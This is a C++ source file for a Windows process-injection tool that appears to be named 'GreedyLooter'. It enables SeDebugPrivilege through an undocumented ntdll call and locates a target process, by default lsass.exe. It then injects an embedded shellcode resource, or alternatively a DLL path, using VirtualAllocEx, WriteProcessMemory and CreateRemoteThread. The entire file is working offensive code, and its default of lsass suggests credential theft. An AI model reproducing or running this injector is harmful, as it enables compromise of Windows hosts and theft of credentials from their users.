#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include "resource.h"

#define SE_DEBUG_PRIVILEGE 20

// Shellcode resources used in shellcodeInject
// Import shellcode resource:
// https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
//HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CALC1), L"CALC");
HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_GREEDYLOOTER1), L"GREEDYLOOTER");
DWORD cShellcodeSize = SizeofResource(NULL, shellcodeResource);
HGLOBAL cShellcode = LoadResource(NULL, shellcodeResource);

// if shellcode is literal must be unsigned char type
// const unsigned char* literals have a max size of 65535

// dll path used in dllPathInject
const LPCWSTR cDllPath = L"C:\\Users\\User\\Source\\Repos\\GreedyLooter\\x64\\Release\\GreedyLooter.dll";

// get Process ID by process name
DWORD getPID(LPCWSTR procName = L"lsass.exe") {

	// take snapshot of current process
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
	DWORD processId = NULL;

	// grab lsass.exe PID
	if (Process32First(snapshot, &entry) != TRUE) return NULL; // Check if snapshot has process information
	while (Process32Next(snapshot, &entry) == TRUE) {
		if (_wcsicmp(entry.szExeFile, procName) == 0) {  
			processId = entry.th32ProcessID;
		}
	}
    CloseHandle(snapshot);

	return processId;
}

// inject the dllpath into the remote process, then start a remote thread calling LoadLibrary on dllPath
BOOL dllPathInject(DWORD processId, LPCWSTR dllPath = cDllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// Allocate Buffer for dllPath in remote process
	LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Write dllPath to remote buffer
	BOOL cWrite = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)dllPath, (wcslen(dllPath) + 1) * sizeof(WCHAR), NULL);
	// retrieve address of LoadLibraryW function from Kernel32.dll
	FARPROC addressLoadLibraryW = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
	// create a thread in the remote process that starts execution with LoadLibraryW(rBuffer) in Kernel32.dll
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addressLoadLibraryW, rBuffer, 0, NULL);

	// //check exitcode from remote thread
	//WaitForSingleObject(hThread, INFINITE);
	//DWORD exitCode;
	//GetExitCodeThread(hThread, &exitCode);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	
	return true;
}

// boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// Runtime libraries enable privileges, native api method of changing privileges (undocumented ntdll function)
// returns previous debug privilege state
BOOLEAN setRtlSEDebug() {
	BOOLEAN bPreviousPrivilegeStatus = FALSE; 
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
	return bPreviousPrivilegeStatus;
}

// inject shellcode into remote process then start remote thread calling shellcode
BOOL shellcodeInject(DWORD processId, HGLOBAL shellcode = cShellcode, const size_t shellcodeSize = cShellcodeSize) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// Allocate Buffer for shellcode in remote process
	LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	// Write shellcode to remote buffer
	BOOL cWrite = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)shellcode, shellcodeSize, NULL);
	// create a thread in the remote process that starts execution on shellcode
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);

	return true;
}

// first argument will be the process ID
int wmain(int argc, wchar_t *argv[])
{
	DWORD processId;
	// edgecase: process-name begins with number
	if (isdigit(argv[1][0])) {
		processId = _wtoi(argv[1]);
	}else{
		processId = getPID(argv[1]);
	}

	setRtlSEDebug();
	shellcodeInject(processId);
	//dllPathInject(processId);

	return 0;
}
